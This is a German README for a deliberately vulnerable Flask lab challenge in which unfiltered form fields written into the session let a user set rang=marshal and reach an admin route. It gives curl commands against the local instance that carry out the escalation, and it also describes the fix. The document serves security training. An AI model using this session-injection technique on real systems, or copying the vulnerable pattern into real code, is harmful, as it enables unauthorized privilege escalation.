# challenge_session_puppetry/ — Übungs-Ziel: Flask-Session-Abuse (Privilege Escalation)

Bewusst verwundbare Mini-Flask-App. Die Route `/einstellungen` übernimmt **jedes**
Formularfeld ungefiltert in die Session (`session[key] = value`). Dadurch lässt
sich ein ungeplantes `rang=marshal` einschleusen und das Admin-Gate `/marshal`
öffnen — **ohne** den `SECRET_KEY` (der ist hier stark/zufällig) und ohne
Marshal-Login. Der Server signiert die manipulierte Session selbst.

> Abgrenzung: Das ist **nicht** die Weak-SECRET_KEY-Fälschung aus
> `challenge_session_forgery` / Ordner `13_session_forgery`. Hier ist der Key
> sicher; der Fehler ist, Nutzereingaben in die Session zu vertrauen.

> Nur gegen die eigene/autorisierte Instanz. Standard-Bind `127.0.0.1`; für die
> Nachbar-Challenge `HOST=0.0.0.0` setzen.

## Dateien
- `app.py` — die verwundbare App (`python app.py` → `http://127.0.0.1:5007`)
- `challenge.md` — die Aufgabenstellung

## Schnellstart
```powershell
pip install -r requirements.txt
python app.py
# Login team-test/test123, dann:
# curl -s -c jar -d "username=team-test&password=test123" http://127.0.0.1:5007/login -o nul
# curl -s -b jar -c jar -d "anzeigename=Doc&revolver=Colt&rang=marshal" http://127.0.0.1:5007/einstellungen -o nul
# curl -s -b jar http://127.0.0.1:5007/marshal     # -> 200 + Fahndungsliste
```

**Fix:** Allowlist der beschreibbaren Session-Felder (`anzeigename`, `revolver`);
Rollen/Rechte serverseitig setzen, nie aus dem Formular. Sichere Vergleichsroute:
`/einstellungen-safe` im selben `app.py`.
